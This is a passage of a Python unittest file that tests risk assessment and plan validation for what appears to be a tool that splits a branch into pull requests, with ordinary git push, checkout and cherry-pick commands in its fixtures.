    def test_force_push_risk_always_present(self):
        plan = {
            "pr_number": 1,
            "head_ref": "feat/test",
            "shared_head_sha": "",
            "remote_head_sha": "",
            "push_remote": "origin",
            "is_fork": False,
            "pr_commit_count": 0,
        }
        risks = bs._assess_risks(plan)
        risk_labels = {r.split(":")[0] for r in risks}
        self.assertIn("Force-push risk", risk_labels)
        self.assertIn("CI disruption risk", risk_labels)

    def test_unknown_lease_sha_replaced(self):
        plan = {
            "pr_number": 1,
            "head_ref": "feat/test",
            "shared_head_sha": "",
            "remote_head_sha": "(unknown)",
            "push_remote": "origin",
            "is_fork": False,
            "pr_commit_count": 0,
        }
        risks = bs._assess_risks(plan)
        force_push_risk = [r for r in risks if "Force-push risk" in r][0]
        self.assertIn("REPLACE_WITH_LEASE_SHA", force_push_risk)


class TestPlanValidation(unittest.TestCase):
    """Tests for _validate_plan_output()."""

    def test_valid_plan_passes(self):
        plan = [{
            "pr_number": 1,
            "head_ref": "feat/test",
            "base_ref": "main",
            "safe_push_command": "git push --force-with-lease=...",
            "branch_create_commands": ["git checkout -b feat/test-pr-1 origin/main"],
            "cherry_pick_commands": ["git cherry-pick abc123"],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertTrue(passed)
        self.assertEqual(len(warnings), 0)

    def test_missing_pr_number(self):
        plan = [{
            "head_ref": "feat/test",
            "base_ref": "main",
            "safe_push_command": "git push",
            "branch_create_commands": ["cmd"],
            "cherry_pick_commands": ["cmd"],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertFalse(passed)
        self.assertTrue(any("pr_number" in w for w in warnings))

    def test_missing_head_ref(self):
        plan = [{
            "pr_number": 1,
            "base_ref": "main",
            "safe_push_command": "git push",
            "branch_create_commands": ["cmd"],
            "cherry_pick_commands": ["cmd"],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertFalse(passed)
        self.assertTrue(any("head_ref" in w for w in warnings))

    def test_empty_safe_push_command(self):
        plan = [{
            "pr_number": 1,
            "head_ref": "feat/test",
            "base_ref": "main",
            "safe_push_command": "",
            "branch_create_commands": ["cmd"],
            "cherry_pick_commands": ["cmd"],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertFalse(passed)
        self.assertTrue(any("safe_push_command" in w for w in warnings))

    def test_empty_branch_create_commands(self):
        plan = [{
            "pr_number": 1,
            "head_ref": "feat/test",
            "base_ref": "main",
            "safe_push_command": "git push",
            "branch_create_commands": [],
            "cherry_pick_commands": ["cmd"],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertFalse(passed)
        self.assertTrue(any("branch_create_commands" in w for w in warnings))

    def test_empty_cherry_pick_commands(self):
        plan = [{
            "pr_number": 1,
            "head_ref": "feat/test",
            "base_ref": "main",
            "safe_push_command": "git push",
            "branch_create_commands": ["cmd"],
            "cherry_pick_commands": [],
        }]
        passed, warnings = bs._validate_plan_output(plan)
        self.assertFalse(passed)
        self.assertTrue(any("cherry_pick_commands" in w for w in warnings))

    def test_empty_plans_list_passes(self):
        passed, warnings = bs._validate_plan_output([])
        self.assertTrue(passed)
        self.assertEqual(len(warnings), 0)


if __name__ == "__main__":
    unittest.main()
